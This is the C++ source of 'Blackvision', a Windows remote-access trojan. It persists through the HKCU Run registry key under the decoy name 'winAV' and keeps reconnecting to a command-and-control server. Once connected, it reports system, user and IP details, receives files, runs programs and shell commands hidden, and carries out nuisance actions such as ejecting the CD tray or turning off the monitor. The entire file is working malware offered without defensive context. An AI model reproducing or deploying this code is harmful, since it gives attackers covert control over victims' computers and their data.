//#include "pch.h"
#include "blackvision.h"
//#pragma warning (disable : 4996) 

void Blackvision::reconnect()
{
	closesocket(sockfd);
	WSACleanup();
	Sleep(INTERVAL);
	C2Connect();
}
void Blackvision::startup()
{
	TCHAR file[MAX_PATH];
	HKEY NewVal;
	int fpath = GetModuleFileName(NULL, file, MAX_PATH);
	if (fpath == 0)
	{
		return;
	}
	if (RegOpenKey(HKEY_CURRENT_USER, (LPCSTR)"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal) != ERROR_SUCCESS)
	{
		return;
	}
	if (RegSetValueEx(NewVal, (LPCSTR)"winAV", 0, REG_SZ, (LPBYTE)file, sizeof(file)) != ERROR_SUCCESS)
	{
		return;
	}
	else {
		// std::cout << "Program added to Startup.\n";
		// Do nothing, Program was added to Startup
	}
	RegCloseKey(NewVal);

}


void Blackvision::ExecuteFile(char* filename)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcess((LPCSTR)filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
std::string Blackvision::GetSysinfo()
{
	std::string sysinfo;
	std::string RAM;
	OSVERSIONINFOEX osinfo;
	std::ostringstream rm;
	std::string returnme;
	MEMORYSTATUSEX memstatx;
	std::string filelocation;
	std::string agentPath;
	memstatx.dwLength = sizeof(memstatx);
	GlobalMemoryStatusEx(&memstatx);
	ZeroMemory(&osinfo, sizeof(OSVERSIONINFOEX));
	osinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((LPOSVERSIONINFO)&osinfo);
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	float ramsize = memstatx.ullTotalPhys / (1024 * 1024);
	rm << ramsize;
	RAM = rm.str();
	switch (osinfo.dwMajorVersion)
	{
	case 5:
		if (osinfo.dwMinorVersion == 0)
		{
			sysinfo = "Windows 2000 ";
		}
		else if (osinfo.dwMinorVersion == 1)
		{
			sysinfo = "Windows XP ";
		}
		else if (osinfo.dwMinorVersion == 2)
		{
			sysinfo = "Windows XP ";
		}
		break;
	case 6:
		if (osinfo.dwMinorVersion == 3)
		{
			sysinfo = "Windows 8.1 ";
		}
		else if (osinfo.dwMinorVersion == 2)
		{
			sysinfo = "Windows 8 ";
		}
		else if (osinfo.dwMinorVersion == 1)
		{
			sysinfo = "Windows 7 ";
		}
		else {
			sysinfo = "Windows Vista ";
		}
		break;
	case 10:
		sysinfo = "Windows 10 ";
		break;
	default:
		sysinfo = "Unknown OS ";
	}

	int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath == 0)
	{
		filelocation = "Unknown (Failed to get)";
	}
	else {
		filelocation = DIR;
	}

	returnme = "\n[+] Operating System : " + sysinfo + "\n[+] RAM : " + RAM + " mb" + "\n[+] User-PC : " + username + "/" + hostname + "\n[+] Agent Location : " + filelocation;
	return returnme;
}

void Blackvision::recvFile()
{
	int fsize;
	std::string response;
	std::ofstream recvfile(file_commands[1], std::ios::app | std::ios::binary);
	while ((fsize = recv(sockfd, filebuf, sizeof(filebuf), 0)) > 0)
	{
		recvfile.write(filebuf, sizeof(filebuf));
	}
	recvfile.close();
	response = "Saved " + std::string(file_commands[1]) + ".";
	respond(response.c_str());

}

void Blackvision::Wanip()
{
	HINTERNET hInternet, hFile;
	DWORD rSize;
	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	hFile = InternetOpenUrl(hInternet, _T("http://bot.whatismyipaddress.com/"), NULL, 0, INTERNET_FLAG_RELOAD, 0);
	InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
	wanip[rSize] = '\0';

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);
}

// Split string using C Method. I'm using it. Do whatever you want!
void Blackvision::strsplit(char src[500], char* dest[5]) {
	int i = 0;
	char *p = strtok(src, "=");
	while (p != NULL)
	{
		dest[i++] = p;
		p = strtok(NULL, "=");
	}
}

void Blackvision::ConnectionManage()
{
	while (connected)
	{
		memset(recvbuf, '\0', BUFFER);
		int resc = recv(sockfd, recvbuf, BUFFER, 0);
		if (resc == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
		{
			connected = false;
		}
		std::string command(recvbuf);
		if (command == "test\n")
		{
			respond("Connection is ok!");
		}
		else if (command == "sysinfo\n")
		{
			respond(Blackvision::GetSysinfo().c_str());
		}
		else if (command.find("recvthis") != std::string::npos)
		{
			memset(file_commands, '\0', 500);
			memset(filebuf, '\0', BUFFER);
			strsplit(recvbuf, file_commands);
			// std::cout << "Receiving File " << file_commands[1] << std::endl;
			recvFile();
			// std::cout << "Got File." << std::endl;

		}
		else if (command == "wanip\n") {
			respond((const char*)wanip);
		}
		else if (command.find("msgbox") != std::string::npos)
		{
			memset(msgbox, '\0', 5);
			strsplit(recvbuf, msgbox);
			respond("Displaying Messagebox.");
			MessageBoxA(NULL, msgbox[1], msgbox[2], MB_ICONINFORMATION);
			respond("User Closed Messagebox.");
		}
		// exec [ Hidden Execution of an Application ]
		else if (command.find("exec") != std::string::npos) {
			memset(fcommands, '\0', 5);
			strsplit(recvbuf, fcommands);
			ExecuteFile(fcommands[1]);
			respond("File Executed.");
		}
		else if (command == "hostname")
		{
			respond(hostname);
		}
		else if (command == "username")
		{
			respond(username);
		}
		else if (command == "kill")
		{
			connected = false;
		}
		else if (command.find("cmd") != std::string::npos)
		{
			memset(cmd, '\0', 5);
			strsplit(recvbuf, cmd);
			WinExec(cmd[1], SW_HIDE);
			respond("Command Executed.");
		}
		else if (command == "cdopen")
		{
			mciSendStringA("set cdaudio door open", NULL, 0, 0);
			respond("CD Rom Ejected.");
		}
		else if (command == "cdclose")
		{
			mciSendStringA("set cdaudio door close", NULL, 0, 0);
			respond("CD Rom Closed.");
		}
		else if (command == "monitoroff")
		{
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
			respond("Monitor is now off.");
		}
		else if (command == "monitoron")
		{
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1);
			respond("Monitor is now on.");
		}
		else if (command.find("playaudio") != std::string::npos)
		{
			strsplit(recvbuf, audio);
			PlaySound(audio[1], NULL, SND_FILENAME | SND_ASYNC);
			std::string ans = "Will now play " + std::string(audio[1]);
			respond(ans.c_str());
		}
		else {
			/*
			Unidentified Command
			No response -
			*/
		}
	}

	if (!connected)
	{
		reconnect();
	}
}

void Blackvision::respond(const char * data) {
	int totalsent = 0;
	int lerror = WSAGetLastError();
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = false;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

void Blackvision::C2Connect()
{
	while (true)
	{
		WSADATA wsa;
		DWORD timeout = 1000;
		if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { /* std::cout << "WSA Startup failed : " << WSAGetLastError() << std::endl; exit(1); */ return; };
		sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
		{
			// std::cout << "Failed to Create Socket : " << WSAGetLastError() << std::endl;
			// exit(1);
			return;
		}
		setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

		server.sin_addr.s_addr = inet_addr("127.0.0.1");
		server.sin_port = htons(3567);
		server.sin_family = AF_INET;

		do {
			if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
				// std::cout << "Connection failed : " << WSAGetLastError() << std::endl;
				reconnect();
			}
			else {
				connected = true;
				// std::cout << "Connection Established." << std::endl;
			}
		} while (!connected); // Not Connected, While not connected.

		ConnectionManage();
	}

}
